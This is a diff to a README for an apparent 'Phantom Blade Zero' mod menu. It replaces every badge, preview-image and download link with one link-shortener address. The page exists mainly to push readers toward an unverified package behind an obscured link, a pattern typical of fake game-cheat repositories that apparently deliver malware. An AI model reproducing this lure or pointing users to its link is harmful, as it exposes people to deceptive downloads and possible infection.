@@ -10,28 +10,28 @@ This variant emphasizes main-weapon loadouts, Phantom Edge presets, Wulin combat
 
 ## Quick Access
 
-[![Phantom Blade Zero](https://img.shields.io/badge/Phantom%20Blade%20Zero-Mod%20Menu-9d3027?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Weapons](https://img.shields.io/badge/Weapons-Loadouts-b2854d?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Phantom Edges](https://img.shields.io/badge/Phantom%20Edges-Presets-793832?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Wulin](https://img.shields.io/badge/Wulin-Combat%20Profiles-4a6172?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Profiles](https://img.shields.io/badge/Config-Profiles-5e6265?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Project-7f2922?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Phantom Blade Zero](https://img.shields.io/badge/Phantom%20Blade%20Zero-Mod%20Menu-9d3027?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Weapons](https://img.shields.io/badge/Weapons-Loadouts-b2854d?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Phantom Edges](https://img.shields.io/badge/Phantom%20Edges-Presets-793832?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Wulin](https://img.shields.io/badge/Wulin-Combat%20Profiles-4a6172?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Profiles](https://img.shields.io/badge/Config-Profiles-5e6265?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Project-7f2922?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Phantom Blade Zero Mod Menu Project](https://idleobstacle.github.io/)**
+➡️ **[Download Phantom Blade Zero Mod Menu Project](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Phantom Blade Zero Mod Menu](assets/phantom-blade-zero-mod-menu-preview.png)](https://idleobstacle.github.io/)
+[![Phantom Blade Zero Mod Menu](assets/phantom-blade-zero-mod-menu-preview.png)](https://flyn.co/17yeN7/)
 
 ### Interface
 
-[![Phantom Blade Zero Mod Menu Interface](assets/phantom-blade-zero-mod-menu-interface.png)](https://idleobstacle.github.io/)
+[![Phantom Blade Zero Mod Menu Interface](assets/phantom-blade-zero-mod-menu-interface.png)](https://flyn.co/17yeN7/)
 
 ### Real Game Reference
 
@@ -165,7 +165,7 @@ The objective is to keep a clean menu structure matching the game's revealed wea
 
 1. Download the current project package:
 
-   **[Download Phantom Blade Zero Mod Menu Project](https://idleobstacle.github.io/)**
+   **[Download Phantom Blade Zero Mod Menu Project](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the current project notes.
